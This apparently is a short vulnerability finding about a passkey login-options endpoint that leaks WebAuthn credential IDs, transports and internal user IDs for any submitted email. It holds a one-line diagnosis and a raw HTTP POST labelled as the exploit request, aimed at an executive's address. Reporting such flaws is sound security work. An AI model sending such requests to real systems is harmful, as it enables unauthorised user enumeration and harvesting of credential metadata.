diagnosis: The endpoint accepts an arbitrary user email address and returns the complete list of registered passkey credential IDs, transports, and internal user ID. This endpoint does not require authentication or rate-limiting, enabling attackers to map and harvest registered WebAuthn credential metadata across all corporate employees.
exploit_request:
POST /auth/passkey/login-options HTTP/1.1
Host: login.corp.net
Content-Type: application/json

{"email": "target.executive@corp.net"}
